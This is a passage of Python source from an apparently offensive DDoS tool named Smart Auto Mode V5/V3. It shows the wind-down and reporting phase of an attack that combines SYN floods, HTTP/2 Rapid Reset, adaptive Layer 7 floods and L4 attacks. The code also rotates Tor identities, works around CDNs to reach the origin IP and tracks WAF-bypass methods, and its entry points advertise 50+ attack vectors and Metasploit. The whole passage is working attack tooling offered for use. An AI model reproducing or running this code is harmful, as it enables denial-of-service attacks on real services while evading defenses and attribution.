                        fail = rm.stats.get("fail", 0)
                        mstats = adaptive_dash_map[mname]
                        mstats["total_requests"] = ok + fail
                        mstats["completed"] = ok
                        mstats["failed"] = fail

                if elapsed >= self.duration:
                    break

        # Run attack tasks with monitoring
        main_tasks = [l4_task]
        if baseline_init is not None:
            main_tasks.append(baseline_init)
        if adaptive_task is not None:
            main_tasks.append(adaptive_task)
        if burst_task is not None:
            main_tasks.append(burst_task)
        monitor_task = asyncio.create_task(_monitor_attack())
        py_collector_task = asyncio.create_task(_py_stats_collector())

        try:
            await asyncio.wait_for(
                asyncio.gather(*main_tasks, return_exceptions=True),
                timeout=self.duration + 30
            )
        except asyncio.TimeoutError:
            pass
        except asyncio.CancelledError:
            print(f"\n  {_c('y','[!]')} Attack cancelled by user")
        finally:
            monitor_task.cancel()
            py_collector_task.cancel()

        # Stop the dashboard (prints final summary table)
        await dash.stop()

        # Stop Go engines
        print(f"  {_c('c','[*]')} Stopping all engines...")
        if combined is not None:
            if combined._syn_proc and combined._syn_proc.returncode is None:
                try: combined._syn_proc.kill()
                except: pass
            if combined._rr_proc and combined._rr_proc.returncode is None:
                try: combined._rr_proc.kill()
                except: pass
        if adaptive is not None:
            for mname in list(adaptive.running.keys()):
                await adaptive.stop_method(mname)

        # Stop Python h2 workers
        for th, evt, res, q in h2_tasks:
            evt.set()
            try: await asyncio.get_event_loop().run_in_executor(None, th.join, 3)
            except: pass
        for th, evt, res, q in mv_tasks:
            evt.set()
            try: await asyncio.get_event_loop().run_in_executor(None, th.join, 3)
            except: pass

        # Collect final Python stats
        for th, evt, res, q in h2_tasks:
            py_flood_stats["sent"] = max(py_flood_stats["sent"], int(res.get("sent", 0)))
            py_flood_stats["failed"] = max(py_flood_stats["failed"], int(res.get("failed", 0)))
        for th, evt, res, q in mv_tasks:
            py_flood_stats["sent"] = max(py_flood_stats["sent"], int(res.get("sent", 0)))
            py_flood_stats["failed"] = max(py_flood_stats["failed"], int(res.get("failed", 0)))

        # Stop Tor
        try:
            await self.stop_tor()
        except Exception:
            pass

        # ========================
        # Phase 3: Report & Results
        # ========================
        self.reporter.start_phase("phase_3")
        print(f"\n  {_c('m','[PHASE 3]')} {_c('w','Results & Report')}")
        print(f"  {_c('c','-')*60}")

        syn_ok = syn_fail = rr_ok = rr_fail = 0
        adaptive_ok = adaptive_fail = 0
        if combined is not None:
            combined_result = combined.syn_stats.get("stats", {})
            combined_rr = combined.rr_stats.get("stats", {})
            rr_direct_s = combined._rr_direct_stats.get("stats", {})
            syn_ok = combined_result.get("completed", 0)
            syn_fail = combined_result.get("failed", 0)
            rr_ok = rr_direct_s.get("completed", 0) if rr_direct_s.get("completed", 0) > combined_rr.get("completed", 0) else combined_rr.get("completed", 0)
            rr_fail = rr_direct_s.get("failed", 0) if rr_direct_s.get("completed", 0) > combined_rr.get("completed", 0) else combined_rr.get("failed", 0)

        if adaptive is not None:
            adaptive_result = adaptive.get_results()
            adaptive_ok = adaptive_result.get("total_ok", 0)
            adaptive_fail = adaptive_result.get("total_fail", 0)
        else:
            adaptive_result = {"methods": {}, "top_methods": [], "peak_rps": 0}

        l4_result = {}
        try: l4_result = l4_task.result()
        except: pass

        l4_total = sum(v.get("sent", 0) for v in l4_result.values() if isinstance(v, dict))
        py_sent = py_flood_stats.get("sent", 0)
        grand_total = syn_ok + syn_fail + rr_ok + rr_fail + adaptive_ok + adaptive_fail + l4_total + py_sent

        print(f"\n  {_c('w','ATTACK RESULTS')}")
        print(f"  {_c('c','-')*60}")
        print(f"  {_c('d','SYN Flood:')}        {_c('g',format(syn_ok,','))+' ok'}  |  {_c('r',format(syn_fail,','))+' fail'}")
        print(f"  {_c('d','Rapid Reset:')}      {_c('g',format(rr_ok,','))+' ok'}  |  {_c('r',format(rr_fail,','))+' fail'}")
        print(f"  {_c('d','Adaptive L7:')}      {_c('g',format(adaptive_ok,','))+' ok'}  |  {_c('r',format(adaptive_fail,','))+' fail'}")
        print(f"  {_c('d','L4 Attacks:')}       {_c('y',format(l4_total,','))+' packets'}")
        print(f"  {_c('c','-')*60}")
        print(f"  {_c('w','GRAND TOTAL:')}      {_c('g',format(grand_total,','))+' requests'}")
        print()

        print(f"  {_c('w','TARGET INFO')}")
        print(f"  {_c('c','-')*60}")
        print(f"  {_c('d','Server:')}           {_c('w',profile_data.get('server_type', 'unknown'))}")
        print(f"  {_c('d','CDN:')}              {_c('y',origin_data.get('cdn', 'unknown'))}")
        print(f"  {_c('d','Origin IP:')}        {_c('g' if self.origin_ip else 'r',self.origin_ip or '(behind CDN)')}")
        print(f"  {_c('d','HTTP/2:')}           {_c('g' if profile_data.get('has_http2') else 'r','YES' if profile_data.get('has_http2') else 'NO')}")
        print(f"  {_c('d','WAF:')}              {_c('r' if profile_data.get('waf_detected') else 'g','DETECTED' if profile_data.get('waf_detected') else 'NO')}")
        print()

        if adaptive_result.get("methods"):
            print(f"  {_c('w','TOP METHODS')}")
            print(f"  {_c('c','-')*60}")
            for mname, mdata in list(adaptive_result.get("methods", {}).items())[:5]:
                ok = mdata.get("ok", 0)
                rps = mdata.get("rps", 0)
                print(f"  {_c('w',mname):20s}  {_c('g',format(ok,','))+' ok'}  |  {_c('c',str(round(rps,1)))+' rps'}")
            print()

        if l4_result:
            print(f"  {_c('w','L4 METHODS')}")
            print(f"  {_c('c','-')*60}")
            for mname, mdata in l4_result.items():
                if isinstance(mdata, dict):
                    sent = mdata.get("sent", mdata.get("active_connections", 0))
                    print(f"  {_c('w',mname):20s}  {_c('y',format(sent,','))+' packets'}")
            print()

        # Build summary for reporter
        summary = {
            "grand_total": grand_total,
            "rr_ok": rr_ok, "rr_fail": rr_fail,
            "syn_ok": syn_ok, "syn_fail": syn_fail,
            "adaptive_ok": adaptive_ok, "adaptive_fail": adaptive_fail,
            "l4_total": l4_total,
            "py_h2_total": py_sent,
            "peak_rps": adaptive_result.get("peak_rps", 0) if adaptive_result else 0,
            "server_type": profile_data.get("server_type", "unknown"),
            "top_methods": adaptive_result.get("top_methods", []),
            "waf_detected": profile_data.get("waf_detected", False),
            "origin_ip": self.origin_ip or "not found",
            "has_http2": profile_data.get("has_http2", False),
            "v5_vectors_working": len(v5_probe_data),
            "cdn": origin_data.get("cdn", "unknown"),
        }

        self.reporter.finalize(summary)
        self.reporter.end_phase("phase_3", {"summary": summary})

        print(f"  {_c('w','REPORT')}")
        print(f"  {_c('c','-')*60}")
        print(f"  {_c('d','Report ID:')}        {_c('c',self.report_id)}")
        print(f"  {_c('d','Status:')}           {_c('g','COMPLETED')}")
        print()

        return {
            "engine": "auto_mode_v5",
            "target": self.target,
            "origin_ip": self.origin_ip,
            "server_type": profile_data.get("server_type", "generic"),
            "duration": self.duration,
            "syn_ok": syn_ok, "syn_fail": syn_fail,
            "rr_ok": rr_ok, "rr_fail": rr_fail,
            "adaptive_ok": adaptive_ok, "adaptive_fail": adaptive_fail,
            "l4_total": l4_total,
            "grand_total": grand_total,
            "methods": adaptive_result.get("methods", {}),
            "top_methods": adaptive_result.get("top_methods", []),
            "l4_methods": list(l4_result.keys()),
            "v5_vectors": list(v5_probe_data.keys()),
            "tor_rotations": adaptive.total_tor_rotations,
            "has_http2": profile_data.get("has_http2", False),
            "waf_detected": profile_data.get("waf_detected", False),
            "origin_ips": origin_data.get("origin_ips", []),
            "cdn": origin_data.get("cdn", ""),
            "bypass": {
                "waf_methods": len(self.bypass_info.get("waf", {}).get("working_methods", [])),
                "cookies_warmed": bool(cookie_warmup_cookies or session_warming_cookies),
                "header_pool_categories": waf_headers_pool_count,
                "encoding_tricks": len(waf_results.get("working_encodings", [])),
            },
        }


# ======================================================================
# Public entry point for V5
# ======================================================================

async def run_auto_mode_v5(
    target: str,
    origin_ip: str = "",
    duration: int = 600,
    syn_threads: int = 500,
    rr_threads: int = 100,
    tor_instances: int = 15,
    rotation_interval: int = 45,
) -> Dict[str, Any]:
    """
    Smart Auto Mode V5 - Full pipeline with 50+ attack vectors.
    Includes origin discovery V2, V5 L7 methods, L4 attacks, Metasploit,
    enhanced Tor, and report generation.
    """
    st_key = os.environ.get("SECURITYTRAILS_API_KEY", "")
    engine = SmartAutoModeV5(
        target=target, origin_ip=origin_ip, duration=duration,
        syn_threads=syn_threads, rr_threads=rr_threads,
        tor_instances=tor_instances, rotation_interval=rotation_interval,
        securitytrails_key=st_key,
    )
    return await engine.run()


# ======================================================================
# V3 Public entry point
# ======================================================================

async def run_auto_mode_v3(
    target: str,
    origin_ip: str = "",
    duration: int = 600,
    syn_threads: int = 500,
    rr_threads: int = 100,
    tor_instances: int = 15,
    rotation_interval: int = 45,
) -> Dict[str, Any]:
    """
    Smart Auto Mode V3 - AI-powered adaptive attack engine.
    Profiles server, probes methods (Bayesian scoring), then launches
    baseline SYN+RR + adaptive top methods in parallel.

    Args:
        target: Target URL
        origin_ip: Server origin IP for direct SYN flood
        duration: Attack duration in seconds
        syn_threads: Goroutines for SYN flood
        rr_threads: Goroutines for Rapid Reset
        tor_instances: Number of Tor instances
        rotation_interval: Seconds between Tor IP rotations

    Returns:
        Dict with aggregated results
    """
    engine = SmartAutoModeV3(
        target=target, origin_ip=origin_ip, duration=duration,
        syn_threads=syn_threads, rr_threads=rr_threads,
        tor_instances=tor_instances, rotation_interval=rotation_interval,
    )
    return await engine.run()
